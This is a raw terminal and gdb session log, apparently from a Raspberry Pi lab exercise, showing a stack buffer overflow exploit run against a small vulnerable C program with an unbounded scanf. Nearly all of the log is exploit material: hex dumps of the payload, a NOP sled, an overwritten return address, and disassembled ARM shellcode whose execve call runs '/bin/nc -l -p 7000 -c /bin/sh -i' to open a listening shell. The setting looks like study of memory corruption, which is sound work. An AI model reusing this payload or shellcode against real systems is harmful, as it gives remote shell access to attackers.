pi@raspberrypi3_a0c2:~/cs $ ./target < exploitarm
7efff62c
input 7EFFF62C>
1173 bytes read
0x7efff62c: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0x7efff63c: 95 04 00 00 00 F7 FF FF 18 00 00 00 00 F7 FF 7E ¦....¦¦¦.....¦¦~
0x7efff64c: 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E .¦¦~.¦¦~.¦¦~.¦¦~
0x7efff65c: 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E 00 00 00 00 .¦¦~.¦¦~.¦¦~....
0x7efff66c: 61 72 67 3E 2F 62 69 6E 2F 6E 63 00 2D 6C 00 2D arg>/bin/nc.-l.-
0x7efff67c: 70 00 37 30 30 30 00 2D 63 00 2F 62 69 6E 2F 73 p.7000.-c./bin/s
0x7efff68c: 68 21 2D 69 00 00 00 00 00 00 00 00 00 00 00 00 h!-i............
0x7efff69c: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x7efff6ac: 00 65 6E 76 3E 00 00 00 00 6E 6F 70 3E 00 00 00 .env>....nop>...
0x7efff6bc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6cc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6dc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6ec: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6fc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff70c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff71c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff72c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff73c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff74c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff75c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff76c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff77c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff78c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff79c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff7ac: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff7bc: 0E 00 00 EA 6C FE FF FF 74 FE FF FF 77 FE FF FF ...¦l¦¦¦t¦¦¦w¦¦¦
0x7efff7cc: 7A FE FF FF 7F FE FF FF 82 FE FF FF 89 FE FF FF z¦¦¦¦¦¦¦¦¦¦¦¦¦
0x7efff7dc: 8D FE FF FF 91 FE FF FF 95 FE FF FF 99 FE FF FF ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
0x7efff7ec: 9D FE FF FF A1 FE FF FF AD FE FF FF A4 00 00 00 ¦¦¦¦¦¦¦¦¦¦¦¦¦...
0x7efff7fc: 0F 40 A0 E1 00 00 A0 E1 00 00 A0 E1 18 70 1F E5 .@¦¦..¦¦..¦¦.p.¦
0x7efff80c: 07 70 84 E0 B0 30 D7 E1 02 3C 83 E2 B0 30 C7 E1 .p¦¦0¦¦.<¦¦0¦¦
0x7efff81c: 64 70 1F E5 07 70 84 E0 50 00 1F E5 00 00 84 E0 dp.¦.p¦¦P..¦..¦¦
0x7efff82c: 00 70 80 E5 74 70 1F E5 07 70 84 E0 60 00 1F E5 .p¦¦tp.¦.p¦¦`..¦
0x7efff83c: 00 00 84 E0 00 70 80 E5 84 70 1F E5 07 70 84 E0 ..¦¦.p¦¦p.¦.p¦¦
0x7efff84c: 70 00 1F E5 00 00 84 E0 00 70 80 E5 94 70 1F E5 p..¦..¦¦.p¦¦p.¦
0x7efff85c: 07 70 84 E0 80 00 1F E5 00 00 84 E0 00 70 80 E5 .p¦¦..¦..¦¦.p¦¦
0x7efff86c: A4 70 1F E5 07 70 84 E0 90 00 1F E5 00 00 84 E0 ¦p.¦.p¦¦..¦..¦¦
0x7efff87c: 00 70 80 E5 B4 70 1F E5 07 70 84 E0 A0 00 1F E5 .p¦¦p.¦.p¦¦..¦
0x7efff88c: 00 00 84 E0 00 70 80 E5 C4 00 1F E5 00 00 84 E0 ..¦¦.p¦¦¦..¦..¦¦
0x7efff89c: 00 70 D0 E5 01 70 47 E2 00 70 C0 E5 BC 00 1F E5 .p¦¦.pG¦.p¦¦..¦
0x7efff8ac: 00 00 84 E0 F8 00 1F E5 00 00 84 E0 E4 10 1F E5 ..¦¦¦..¦..¦¦¦..¦
0x7efff8bc: 01 10 84 E0 6F 70 A0 E3 64 70 47 E2 00 00 00 EF ..¦¦op¦¦dpG¦...¦
0x7efff8cc: 3C 69 6E 74 00 44 47 5F 53 45 53 53 49 4F 4E 5F <int.DG_SESSION_
0x7efff8dc: 49 44 3D 63 34 00 54 45 52 4D 3D 78 74 65 72 6D ID=c4.TERM=xterm
0x7efff8ec: 00 53 48 45 4C 4C 3D 2F 62 69 6E 2F 62 61 73 68 .SHELL=/bin/bash
0x7efff8fc: 00 53 53 48 5F 43 4C 49 45 4E 54 3D 31 39 32 2E .SSH_CLIENT=192.
0x7efff90c: 31 36 38 2E 30 2E 31 30 33 20 36 31 39 38 35 20 168.0.103 61985
0x7efff91c: 32 32 00 53 53 48 5F 54 54 59 3D 2F 64 65 76 2F 22.SSH_TTY=/dev/
0x7efff92c: 70 74 73 2F 30 00 55 53 45 52 3D 70 69 00 4C 53 pts/0.USER=pi.LS
0x7efff93c: 5F 43 4F 4C 4F 52 53 3D 72 73 3D 30 3A 64 69 3D _COLORS=rs=0:di=
0x7efff94c: 30 31 3B 33 34 3A 6C 6E 3D 30 31 3B 33 36 3A 6D 01;34:ln=01;36:m
0x7efff95c: 68 3D 30 30 3A 70 69 3D 34 30 3B 33 33 3A 73 6F h=00:pi=40;33:so
0x7efff96c: 3D 30 31 3B 33 35 3A 64 6F 3D 30 31 3B 33 35 3A =01;35:do=01;35:
0x7efff97c: 62 64 3D 34 30 3B 33 33 3B 30 31 3A 63 64 3D 34 bd=40;33;01:cd=4
0x7efff98c: 30 3B 33 33 3B 30 31 3A 6F 72 3D 34 30 3B 33 31 0;33;01:or=40;31
0x7efff99c: 3B 30 31 3A 73 75 3D 33 37 3B 34 31 3A 73 67 3D ;01:su=37;41:sg=
0x7efff9ac: 33 30 3B 34 33 3A 63 61 3D 33 30 3B 34 31 3A 74 30;43:ca=30;41:t
0x7efff9bc: 77 3D 33 30 3B 34 32 3A 6F 77 3D 33 34 3B 34 32 w=30;42:ow=34;42
0x7efff9cc: 3A 73 74 3D 33 37 3B 34 34 3A 65 78 3D 30 31 3B :st=37;44:ex=01;
0x7efff9dc: 33 32 3A 2A 2E 74 61 72 3D 30 31 3B 33 31 3A 2A 32:*.tar=01;31:*
0x7efff9ec: 2E 74 67 7A 3D 30 31 3B 33 31 3A 2A 2E 61 72 63 .tgz=01;31:*.arc
0x7efff9fc: 3D 30 31 3B 33 31 3A 2A 2E 61 72 6A 3D 30 31 3B =01;31:*.arj=01;
0x7efffa0c: 33 31 3A 2A 2E 74 61 7A 3D 30 31 3B 33 31 3A 2A 31:*.taz=01;31:*
0x7efffa1c: 2E 6C 68 61 3D 30 31 3B 33 31 3A 2A 2E 6C 7A 34 .lha=01;31:*.lz4
0x7efffa2c: 3D 30 31 3B 33 31 3A 2A 2E 6C 7A 68 3D 30 31 3B =01;31:*.lzh=01;
0x7efffa3c: 33 31 3A 2A 2E 6C 7A 6D 61 3D 30 31 3B 33 31 3A 31:*.lzma=01;31:
0x7efffa4c: 2A 2E 74 6C 7A 3D 30 31 3B 33 31 3A 2A 2E 74 78 *.tlz=01;31:*.tx
0x7efffa5c: 7A 3D 30 31 3B 33 31 3A 2A 2E 74 7A 6F 3D 30 31 z=01;31:*.tzo=01
0x7efffa6c: 3B 33 31 3A 2A 2E 74 37 7A 3D 30 31 3B 33 31 3A ;31:*.t7z=01;31:
0x7efffa7c: 2A 2E 7A 69 70 3D 30 31 3B 33 31 3A 2A 2E 7A 3D *.zip=01;31:*.z=
0x7efffa8c: 30 31 3B 33 31 3A 2A 2E 5A 3D 30 31 3B 33 31 3A 01;31:*.Z=01;31:
0x7efffa9c: 2A 2E 64 7A 3D 30 31 3B 33 31 3A 2A 2E 67 7A 3D *.dz=01;31:*.gz=
0x7efffaac: 30 31 3B 33 31 3A 2A 2E 6C 72 7A 3D 30 31 3B 33 01;31:*.lrz=01;3
0x7efffabc: 31 3A 2A 2E 6C 1:*.l
BBBBBBBBBBBBBBBB¦
Errore di segmentazione
pi@raspberrypi3_a0c2:~/cs $
pi@raspberrypi3_a0c2:~/cs $
pi@raspberrypi3_a0c2:~/cs $
pi@raspberrypi3_a0c2:~/cs $
pi@raspberrypi3_a0c2:~/cs $
pi@raspberrypi3_a0c2:~/cs $ ./vulnerable
input 7EFFF624> ciao
djbp
pi@raspberrypi3_a0c2:~/cs $ gdb ./target
GNU gdb (Raspbian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "arm-linux-gnueabihf".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./target...done.
(gdb) l 0
1       #include <stdio.h>
2
3       void f()
4       {
5         char buffer[16];
6         int i, l;
7         unsigned char cc[17];
8         printf("%x\n", (unsigned int)buffer);
9         printf("input %X> ", buffer);
10          /*svuota il buffer*/
(gdb) l
11        fflush(stdout);
12        scanf("%s", buffer);
13
14        l = 1173;
15
16        printf("\n%d bytes read\n", l);
17        i = 0;
18        while (i<l)
19        {
20              unsigned char c = buffer[i];
(gdb) l
21              if ((i & 0xF) == 0)
22              {
23                      printf("%p: ", &buffer[i]);
24              }
25              printf("%02X ", c);
26              if (c<' ')
27                      c = '.';
28              cc[i & 0xF] = c;
29              cc[(i&0xF)+1] = 0;
30              i++;
(gdb) l
31              if (((i & 0xF) == 0) || (i == l))
32                      printf("%s\n", cc);
33      /*      printf("%8X: %.2X %.2X %.2X %.2X %.2X %.2X %.2X %.2X - %.2X %.2X %.2X %.2X %.2X %.2X %.2X %.2X %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",
34                      &buffer[i], (unsigned char)buffer[i], (unsigned char)buffer[i+1], (unsigned char)buffer[i+2], (unsigned char)buffer[i+3], (unsigned char)buffer[i+4], (unsigned char)buffer[i+5], (unsigned char)buffer[i+6], (unsigned char)buffer[i+7], (unsigned char)buffer[i+8],
35                      (unsigned char)buffer[i+9],  (unsigned char)buffer[i+10], (unsigned char)buffer[i+11], (unsigned char)buffer[i+12], (unsigned char)buffer[i+13], (unsigned char)buffer[i+14], (unsigned char)buffer[i+15],
36                      (unsigned char)buffer[i], (unsigned char)buffer[i+1], (unsigned char)buffer[i+2], (unsigned char)buffer[i+3], (unsigned char)buffer[i+4], (unsigned char)buffer[i+5], (unsigned char)buffer[i+6], (unsigned char)buffer[i+7], (unsigned char)buffer[i+8],
37                      (unsigned char)buffer[i+9],  (unsigned char)buffer[i+10], (unsigned char)buffer[i+11], (unsigned char)buffer[i+12], (unsigned char)buffer[i+13], (unsigned char)buffer[i+14], (unsigned char)buffer[i+15]);
38              i+=16;
39      */
40        }
(gdb) b 12
Breakpoint 1 at 0x10598: file target.c, line 12.
(gdb) l
41        i=0;
42        while ( buffer[i]>=' ' )
43        {
44          fputc(buffer[i]+1, stdout);
45          i++;
46        }
47        printf("\n");
48      }
49
50      int main(int argc, char** argv)
(gdb) b 48
Breakpoint 2 at 0x10704: file target.c, line 48.
(gdb) r
Starting program: /home/pi/cs/target
7efff60c
input 7EFFF60C>
Breakpoint 1, f () at target.c:12
12        scanf("%s", buffer);
(gdb) info registers
r0             0x0      0
r1             0x0      0
r2             0x1      1
r3             0x0      0
r4             0x0      0
r5             0x0      0
r6             0x10434  66612
r7             0x0      0
r8             0x0      0
r9             0x0      0
r10            0x76fff000       1996484608
r11            0x7efff62c       2130703916
r12            0x0      0
sp             0x7efff5f8       0x7efff5f8
lr             0x76ed0008       1995243528
pc             0x10598  0x10598 <f+60>
cpsr           0x60000010       1610612752
(gdb) x /10x $sp
0x7efff5f8:     0x00000004      0x76e68be8      0x00000000      0x76e689f8
0x7efff608:     0x7efff640      0x76fd918c      0x00000000      0x00000000
0x7efff618:     0x00010524      0x000107a0
(gdb) x
0x7efff620:     0x76fa3ba0
(gdb) x
0x7efff624:     0x00010750
(gdb) x
0x7efff628:     0x7efff63c
(gdb) x
0x7efff62c:     0x00010744
(gdb) x
0x7efff630:     0x7efff794
(gdb)
0x7efff634:     0x00000001
(gdb) x /16x $sp
0x7efff5f8:     0x00000004      0x76e68be8      0x00000000      0x76e689f8
0x7efff608:     0x7efff640      0x76fd918c      0x00000000      0x00000000
0x7efff618:     0x00010524      0x000107a0      0x76fa3ba0      0x00010750
0x7efff628:     0x7efff63c      0x00010744      0x7efff794      0x00000001
(gdb)
0x7efff638:     0x00000000      0x76e7d294      0x76fa2000      0x7efff794
0x7efff648:     0x00000001      0x0001072c      0x76ff8318      0x76ff8000
0x7efff658:     0x00000000      0x00000000      0x00010434      0x00000000
0x7efff668:     0x00000000      0x00000000      0x76fff000      0x00000000
(gdb)
0x7efff678:     0x28f056f5      0x20e872e5      0x00000000      0x00000000
0x7efff688:     0x00000000      0x00000000      0x00000000      0x00000000
0x7efff698:     0x00000000      0x00000000      0x00000000      0x00000000
0x7efff6a8:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) l 0
1       #include <stdio.h>
2
3       void f()
4       {
5         char buffer[16];
6         int i, l;
7         unsigned char cc[17];
8         printf("%x\n", (unsigned int)buffer);
9         printf("input %X> ", buffer);
10          /*svuota il buffer*/
(gdb)
11        fflush(stdout);
12        scanf("%s", buffer);
13
14        l = 1173;
15
16        printf("\n%d bytes read\n", l);
17        i = 0;
18        while (i<l)
19        {
20              unsigned char c = buffer[i];
(gdb) b 14
Breakpoint 3 at 0x105a8: file target.c, line 14.
(gdb) c
Continuing.
12345678901234

Breakpoint 3, f () at target.c:14
14        l = 1173;
(gdb) x /16x $sp
0x7efff5f8:     0x00000004      0x76e68be8      0x00000000      0x76e689f8
0x7efff608:     0x7efff640      0x34333231      0x38373635      0x32313039
0x7efff618:     0x00003433      0x000107a0      0x76fa3ba0      0x00010750
0x7efff628:     0x7efff63c      0x00010744      0x7efff794      0x00000001
(gdb)
0x7efff638:     0x00000000      0x76e7d294      0x76fa2000      0x7efff794
0x7efff648:     0x00000001      0x0001072c      0x76ff8318      0x76ff8000
0x7efff658:     0x00000000      0x00000000      0x00010434      0x00000000
0x7efff668:     0x00000000      0x00000000      0x76fff000      0x00000000
(gdb)
0x7efff678:     0x28f056f5      0x20e872e5      0x00000000      0x00000000
0x7efff688:     0x00000000      0x00000000      0x00000000      0x00000000
0x7efff698:     0x00000000      0x00000000      0x00000000      0x00000000
0x7efff6a8:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) restore ./exploitarm binary 0x7efff60c
Restoring binary file ./exploitarm into memory (0x7efff60c to 0x7efff8b1)
(gdb) x /16x $sp
0x7efff5f8:     0x00000004      0x76e68be8      0x00000000      0x76e689f8
0x7efff608:     0x7efff640      0x41414141      0x41414141      0x41414141
0x7efff618:     0x41414141      0x7efff700      0x7efff700      0x7efff700
0x7efff628:     0x7efff700      0x7efff700      0x7efff700      0x7efff700
(gdb)
0x7efff638:     0x7efff700      0x7efff700      0x7efff700      0x7efff700
0x7efff648:     0x00000000      0x3e677261      0x6e69622f      0x00636e2f
0x7efff658:     0x2d006c2d      0x30370070      0x2d003030      0x622f0063
0x7efff668:     0x732f6e69      0x692d2168      0x00000000      0x00000000
(gdb)
0x7efff678:     0x00000000      0x00000000      0x00000000      0x00000000
0x7efff688:     0x00000000      0x766e6500      0x0000003e      0x706f6e00
0x7efff698:     0x0000003e      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff6a8:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
(gdb)
0x7efff6b8:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff6c8:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff6d8:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff6e8:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
(gdb)
0x7efff6f8:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff708:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff718:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff728:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
(gdb)
0x7efff738:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff748:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff758:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff768:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
(gdb)
0x7efff778:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff788:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff798:     0xe1a00000      0xea00000e      0xfffffe6c      0xfffffe74
0x7efff7a8:     0xfffffe77      0xfffffe7a      0xfffffe7f      0xfffffe82
(gdb)
0x7efff7b8:     0xfffffe89      0xfffffe8d      0xfffffe91      0xfffffe95
0x7efff7c8:     0xfffffe99      0xfffffe9d      0xfffffea1      0xfffffead
0x7efff7d8:     0x000000a4      0xe1a0400f      0xe1a00000      0xe1a00000
0x7efff7e8:     0xe51f7018      0xe0847007      0xe1d730b0      0xe2833c02
(gdb)
0x7efff7f8:     0xe1c730b0      0xe51f7064      0xe0847007      0xe51f0050
0x7efff808:     0xe0840000      0xe5807000      0xe51f7074      0xe0847007
0x7efff818:     0xe51f0060      0xe0840000      0xe5807000      0xe51f7084
0x7efff828:     0xe0847007      0xe51f0070      0xe0840000      0xe5807000
(gdb)
0x7efff838:     0xe51f7094      0xe0847007      0xe51f0080      0xe0840000
0x7efff848:     0xe5807000      0xe51f70a4      0xe0847007      0xe51f0090
0x7efff858:     0xe0840000      0xe5807000      0xe51f70b4      0xe0847007
0x7efff868:     0xe51f00a0      0xe0840000      0xe5807000      0xe51f00c4
(gdb)
0x7efff878:     0xe0840000      0xe5d07000      0xe2477001      0xe5c07000
0x7efff888:     0xe51f00bc      0xe0840000      0xe51f00f8      0xe0840000
0x7efff898:     0xe51f10e4      0xe0841001      0xe3a0706f      0xe2477064
0x7efff8a8:     0xef000000      0x746e693c      0x632f690a      0x61742f73
(gdb) x /32i 0x7efff79c
   0x7efff79c:  b       0x7efff7dc
   0x7efff7a0:                  ; <UNDEFINED> instruction: 0xfffffe6c
   0x7efff7a4:                  ; <UNDEFINED> instruction: 0xfffffe74
   0x7efff7a8:                  ; <UNDEFINED> instruction: 0xfffffe77
   0x7efff7ac:                  ; <UNDEFINED> instruction: 0xfffffe7a
   0x7efff7b0:                  ; <UNDEFINED> instruction: 0xfffffe7f
   0x7efff7b4:                  ; <UNDEFINED> instruction: 0xfffffe82
   0x7efff7b8:                  ; <UNDEFINED> instruction: 0xfffffe89
   0x7efff7bc:                  ; <UNDEFINED> instruction: 0xfffffe8d
   0x7efff7c0:                  ; <UNDEFINED> instruction: 0xfffffe91
   0x7efff7c4:                  ; <UNDEFINED> instruction: 0xfffffe95
   0x7efff7c8:                  ; <UNDEFINED> instruction: 0xfffffe99
   0x7efff7cc:                  ; <UNDEFINED> instruction: 0xfffffe9d
   0x7efff7d0:                  ; <UNDEFINED> instruction: 0xfffffea1
   0x7efff7d4:                  ; <UNDEFINED> instruction: 0xfffffead
   0x7efff7d8:  andeq   r0, r0, r4, lsr #1
   0x7efff7dc:  mov     r4, pc
   0x7efff7e0:  nop                     ; (mov r0, r0)
   0x7efff7e4:  nop                     ; (mov r0, r0)
   0x7efff7e8:  ldr     r7, [pc, #-24]  ; 0x7efff7d8
   0x7efff7ec:  add     r7, r4, r7
   0x7efff7f0:  ldrh    r3, [r7]
   0x7efff7f4:  add     r3, r3, #512    ; 0x200
   0x7efff7f8:  strh    r3, [r7]
   0x7efff7fc:  ldr     r7, [pc, #-100] ; 0x7efff7a0
   0x7efff800:  add     r7, r4, r7
   0x7efff804:  ldr     r0, [pc, #-80]  ; 0x7efff7bc
   0x7efff808:  add     r0, r4, r0
   0x7efff80c:  str     r7, [r0]
   0x7efff810:  ldr     r7, [pc, #-116] ; 0x7efff7a4
   0x7efff814:  add     r7, r4, r7
   0x7efff818:  ldr     r0, [pc, #-96]  ; 0x7efff7c0
(gdb)
   0x7efff81c:  add     r0, r4, r0
   0x7efff820:  str     r7, [r0]
   0x7efff824:  ldr     r7, [pc, #-132] ; 0x7efff7a8
   0x7efff828:  add     r7, r4, r7
   0x7efff82c:  ldr     r0, [pc, #-112] ; 0x7efff7c4
   0x7efff830:  add     r0, r4, r0
   0x7efff834:  str     r7, [r0]
   0x7efff838:  ldr     r7, [pc, #-148] ; 0x7efff7ac
   0x7efff83c:  add     r7, r4, r7
   0x7efff840:  ldr     r0, [pc, #-128] ; 0x7efff7c8
   0x7efff844:  add     r0, r4, r0
   0x7efff848:  str     r7, [r0]
   0x7efff84c:  ldr     r7, [pc, #-164] ; 0x7efff7b0
   0x7efff850:  add     r7, r4, r7
   0x7efff854:  ldr     r0, [pc, #-144] ; 0x7efff7cc
   0x7efff858:  add     r0, r4, r0
   0x7efff85c:  str     r7, [r0]
   0x7efff860:  ldr     r7, [pc, #-180] ; 0x7efff7b4
   0x7efff864:  add     r7, r4, r7
   0x7efff868:  ldr     r0, [pc, #-160] ; 0x7efff7d0
   0x7efff86c:  add     r0, r4, r0
   0x7efff870:  str     r7, [r0]
   0x7efff874:  ldr     r0, [pc, #-196] ; 0x7efff7b8
   0x7efff878:  add     r0, r4, r0
   0x7efff87c:  ldrb    r7, [r0]
   0x7efff880:  sub     r7, r7, #1
   0x7efff884:  strb    r7, [r0]
   0x7efff888:  ldr     r0, [pc, #-188] ; 0x7efff7d4
   0x7efff88c:  add     r0, r4, r0
   0x7efff890:  ldr     r0, [pc, #-248] ; 0x7efff7a0
   0x7efff894:  add     r0, r4, r0
   0x7efff898:  ldr     r1, [pc, #-228] ; 0x7efff7bc
(gdb)
   0x7efff89c:  add     r1, r4, r1
   0x7efff8a0:  mov     r7, #111        ; 0x6f
   0x7efff8a4:  sub     r7, r7, #100    ; 0x64
   0x7efff8a8:  svc     0x00000000
   0x7efff8ac:  strbtvc r6, [lr], #-2364        ; 0x93c
   0x7efff8b0:  teqvs   pc, #163840     ; 0x28000
   0x7efff8b4:  cmnvs   r4, r3, ror pc
   0x7efff8b8:  strbtvc r6, [r5], #-1906        ; 0x772
   0x7efff8bc:  strbmi  r5, [r4, -r0, lsl #16]
   0x7efff8c0:  movtpl  r5, #21343      ; 0x535f
   0x7efff8c4:  mcrmi   9, 2, r4, cr15, cr3, {2}
   0x7efff8c8:  stclcc  9, cr4, [r4, #-380]     ; 0xfffffe84
   0x7efff8cc:  movwpl  r3, #1123       ; 0x463
   0x7efff8d0:  cfstr64mi       mvdx4, [r12], {72}      ; 0x48
   0x7efff8d4:  stmdbvs r2!, {r0, r2, r3, r4, r5, r8, r9, r10, r11, sp}^
   0x7efff8d8:  cmnvs   r2, lr, ror #30
   0x7efff8dc:  strpl   r6, [r0], #-2163        ; 0x873
   0x7efff8e0:  sfmcc   f5, 2, [sp, #-276]      ; 0xfffffeec
   0x7efff8e4:  rsbvc   r7, r5, #120, 8 ; 0x78000000
   0x7efff8e8:  cmppl   r3, #109        ; 0x6d
   0x7efff8ec:  mcrrmi  15, 4, r5, r3, cr8
   0x7efff8f0:  strbpl  r4, [lr], #-1353        ; 0x549
   0x7efff8f4:  eorscc  r3, r9, #1073741839     ; 0x4000000f
   0x7efff8f8:  ldmdacc r6!, {r1, r2, r3, r5, r8, r12, sp}
   0x7efff8fc:  teqcc   lr, lr, lsr #32
   0x7efff900:                  ; <UNDEFINED> instruction: 0x36203330
   0x7efff904:  ldrcc   r3, [r8, #-2353]!       ; 0x931
   0x7efff908:  eorseq  r3, r2, r0, lsr #4
   0x7efff90c:  svcpl   0x00485353
   0x7efff910:  cfldrdcc        mvd5, [r9, #-336]       ; 0xfffffeb0
   0x7efff914:  strbtvc r6, [r5], -pc, lsr #8
   0x7efff918:  cmnvc   r4, #47 ; 0x2f
(gdb) x /8i 0x106f8
   0x106f8 <f+412>:     bhi     0x106b0 <f+340>
   0x106fc <f+416>:     mov     r0, #10
   0x10700 <f+420>:     bl      0x10404
   0x10704 <f+424>:     sub     sp, r11, #4
   0x10708 <f+428>:     pop     {r11, pc}
   0x1070c <f+432>:     andeq   r0, r1, r4, asr #15
   0x10710 <f+436>:     andeq   r0, r1, r8, asr #15
   0x10714 <f+440>:     andeq   r0, r2, r4, lsr r9
(gdb) c
Continuing.

1173 bytes read
0x7efff60c: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0x7efff61c: 95 04 00 00 00 F7 FF FF 18 00 00 00 00 F7 FF 7E ¦....¦¦¦.....¦¦~
0x7efff62c: 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E .¦¦~.¦¦~.¦¦~.¦¦~
0x7efff63c: 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E 00 00 00 00 .¦¦~.¦¦~.¦¦~....
0x7efff64c: 61 72 67 3E 2F 62 69 6E 2F 6E 63 00 2D 6C 00 2D arg>/bin/nc.-l.-
0x7efff65c: 70 00 37 30 30 30 00 2D 63 00 2F 62 69 6E 2F 73 p.7000.-c./bin/s
0x7efff66c: 68 21 2D 69 00 00 00 00 00 00 00 00 00 00 00 00 h!-i............
0x7efff67c: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x7efff68c: 00 65 6E 76 3E 00 00 00 00 6E 6F 70 3E 00 00 00 .env>....nop>...
0x7efff69c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6ac: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6bc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6cc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6dc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6ec: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6fc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff70c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff71c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff72c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff73c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff74c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff75c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff76c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff77c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
